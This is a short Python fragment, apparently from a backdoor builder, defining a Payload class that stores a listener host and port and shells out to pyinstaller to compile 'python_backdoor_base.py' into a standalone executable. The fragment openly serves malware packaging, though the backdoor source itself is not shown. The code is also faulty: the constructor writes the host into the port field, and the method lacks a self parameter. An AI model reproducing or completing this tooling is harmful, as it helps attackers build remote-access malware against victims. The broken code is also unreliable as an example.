import os

class Payload:
    def __init__(self, lhost, lport):
        self.lport = lhost
        self.lport = lport

    def create_payload():
        os.system("pyinstaller --clean --log-level CRITICAL -F --distpath payloads --workpath payloads/build --specpath payloads/build payloads/python_backdoor_base.py")